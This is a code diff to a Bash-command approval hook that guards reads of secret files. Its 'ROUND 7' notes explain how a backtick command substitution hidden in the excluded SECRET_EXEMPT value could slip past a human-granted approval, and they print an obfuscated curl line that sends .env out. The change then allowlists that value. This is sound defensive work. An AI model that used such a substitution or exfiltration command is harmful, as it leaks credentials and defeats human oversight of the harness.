@@ -49,6 +49,14 @@ whitespace -- hashed directly. Not over shell_segments()' parse. Deliberately:
     reason differently must not silently waste a grant. A flag anywhere other
     than the front is left in the hash -- the two ids differ, so the grant
     cannot be spent, which fails SAFE rather than open.
+    ROUND 7 CORRECTION: "approves a command, not a wording" was read, until
+    this round, as license to let the value be ANYTHING -- but bash EXECUTES
+    the value, so "not a wording" is not the same claim as "not able to run
+    code". Excluding the value from the hash is still correct (a re-typed
+    reason must not waste a grant), but it is only SAFE to exclude a value
+    from identity if that value is also constrained so it cannot smuggle in
+    behaviour the id never saw. See ROUND 7, below, and
+    unapprovable_reason()'s allowlist check.
   * Every OTHER character is INCLUDED, including internal whitespace. Collapsing
     it would itself be a lossy transform -- the re-run replays the same bytes,
     so collapsing buys nothing -- and it would reopen a collision class exactly
@@ -138,6 +146,38 @@ one load-bearing check plus three policy-only ones -- not "four
 defence-in-depth refusals, none load-bearing", which was the round-4 to
 round-5 framing and is no longer accurate.
 
+ROUND 7: THE VALUE WAS EXCLUDED FROM THE HASH, BUT BASH STILL RUNS IT
+----------------------------------------------------------------------
+Excluding SECRET_EXEMPT's value from the hash (round 4) closed the identity
+problem -- a re-typed reason can no longer waste a grant -- but it opened a
+different one nobody had asked yet: the value is still part of the COMMAND
+LINE, and bash executes it. A command substitution inside the value rides in
+on an approval granted for the plain command it is attached to, because the
+id the human inspected and the id the flagged re-run computes are IDENTICAL
+-- the value was never part of either one. Measured, PRE-round-7:
+
+    fingerprint("cat .env")                                              = 648b13a0a3555ec5
+    fingerprint("SECRET_EXEMPT=`curl${IFS}-sd@.env${IFS}...` cat .env")   = 648b13a0a3555ec5   <- SAME
+
+grant(id for the plain form), then submit the backtick form: ALLOWED, and the
+grant was consumed. The `$( )` form of the same idea happens to be refused
+already by the multi-segment check below, but that is an ACCIDENT of shlex
+splitting on parens, not a defence built for this -- is_approvable() returns
+True for it when the multi-segment check is bypassed, exactly like the
+backtick form. There is no reason to believe every shell metacharacter has an
+equally lucky accident waiting for it.
+
+Fix: unapprovable_reason() now allowlists the value -- plain letters, digits,
+and `. _ , : / -`, nothing else -- rather than denylisting dangerous
+characters. Four prior rounds (4 through 6) each found one more character
+class or quoting shape that an enumeration had missed; this round does not
+extend that enumeration, it inverts it. The value stays excluded from the
+hash (unchanged), but a command whose value fails the allowlist is refused
+before it is ever treated as approvable, so it can never be granted in the
+first place. A cleanly quoted, space-containing reason (`SECRET_EXEMPT='a
+b'`) is now refused too, not just a malformed one -- there is no legitimate
+need to quote a plain word, and the allowlist does not special-case quoting.
+
 FAIL DIRECTION -- opposite to the rest of the hook, on purpose
 --------------------------------------------------------------
 secret-command-guard.sh fails OPEN on a broken classifier: it sits on every Bash
@@ -196,6 +236,36 @@ def safe_session(session):
 _EXEMPT_PREFIX_RE = re.compile(
     r"^\s*" + EXEMPT_VAR + r"=(?:'[^']*'|\"[^\"]*\"|[^\s'\"]*)\s+"
 )
+
+# Round 7: the same match as _EXEMPT_PREFIX_RE, with a capturing group added
+# around the value, so the value can be checked (see leading_exempt_value())
+# rather than only discarded. The two regexes MUST stay in lockstep -- if this
+# one drifts from _EXEMPT_PREFIX_RE, canonical_text() could strip a shape this
+# check never saw the value of.
+_EXEMPT_PREFIX_VALUE_RE = re.compile(
+    r"^\s*" + EXEMPT_VAR + r"=('[^']*'|\"[^\"]*\"|[^\s'\"]*)\s+"
+)
+
+# Round 7 (task 13 follow-up): the value bash actually executes, allowlisted
+# rather than denylisted -- see unapprovable_reason() for why. Plain letters,
+# digits, and `. _ , : / -`. Nothing else, including a quote character: a
+# quoted value that reaches here still carries its quotes (the capturing group
+# above includes them), so a cleanly quoted reason is refused too, not just a
+# malformed one -- there is no legitimate reason to quote a plain word.
+_EXEMPT_VALUE_ALLOWED_RE = re.compile(r"^[A-Za-z0-9._,:/-]+$")
+
+
+def leading_exempt_value(command):
+    """The raw text of a leading SECRET_EXEMPT=<value> assignment's value.
+
+    None when the command has no such leading assignment -- either there is
+    no flag at all, or it sits somewhere other than the front (a different
+    check below, or canonical_text() itself, handles those cases). Mirrors
+    _EXEMPT_PREFIX_RE's own matching exactly, so this never disagrees with
+    what canonical_text() actually stripped.
+    """
+    match = _EXEMPT_PREFIX_VALUE_RE.match(command)
+    return match.group(1) if match else None
 
 
 def canonical_text(command):
@@ -275,19 +345,35 @@ def accounts_for_every_token(command):
 def unapprovable_reason(command):
     """Why this command cannot be approved, or None if it can.
 
-    STATUS AS OF ROUND 6: three of the four checks below are policy-only, not
-    load-bearing for identity -- fingerprint() hashes the raw command text, so
-    a redirection, a wrapper word and a separator already produce different
-    ids by construction. Running one of those shapes unattended is still a
-    worse idea than making the user approve the plain read, so they still
-    refuse rather than grant, but the id itself was never in danger. The
-    FIRST check below is the exception: it IS load-bearing for identity, not
-    policy. See its own docstring.
+    STATUS AS OF ROUND 7: two of the checks below are load-bearing for
+    identity, not policy -- this round's allowlist check, and round 6's
+    canonical_text()-agreement check. The other three (redirection, wrapper
+    word, multi-segment) are policy-only: fingerprint() hashes the raw
+    command text, so those shapes already produce different ids by
+    construction. Running one of them unattended is still a worse idea than
+    making the user approve the plain read, so they still refuse rather than
+    grant, but the id itself was never in danger from them.
     """
     if "<" in command or ">" in command:
         return ("a redirection is refused as a matter of policy, not because the "
                 "approval id cannot see it -- approving a write alongside a read "
                 "is not something this hatch grants")
+
+    # LOAD-BEARING FOR IDENTITY (round 7 -- task 13 follow-up). The value is
+    # excluded from the hash (see FINGERPRINT SCOPE, above), which is exactly
+    # what makes it dangerous: bash EXECUTES the value even though the id
+    # never saw it, so a command substitution inside it rides in on a grant
+    # made for the plain command it is bolted onto. Rather than enumerate
+    # dangerous shapes -- four prior rounds each found one more character
+    # class an enumeration had missed -- this allowlists the value instead:
+    # plain letters, digits, and `. _ , : / -`. Anything else is refused,
+    # including a cleanly quoted value, since there is no legitimate reason
+    # to quote a plain word.
+    value = leading_exempt_value(command)
+    if value is not None and not _EXEMPT_VALUE_ALLOWED_RE.match(value):
+        return ("the SECRET_EXEMPT reason contains a character outside the plain-word "
+                "allowlist (letters, digits, and '.', '_', ',', ':', '/', '-'); bash "
+                "executes this value, so anything else is refused rather than approved")
 
     # LOAD-BEARING FOR IDENTITY (round 6 -- replaces a round-4 self-test that
     # could never fire). canonical_text() strips exactly one leading
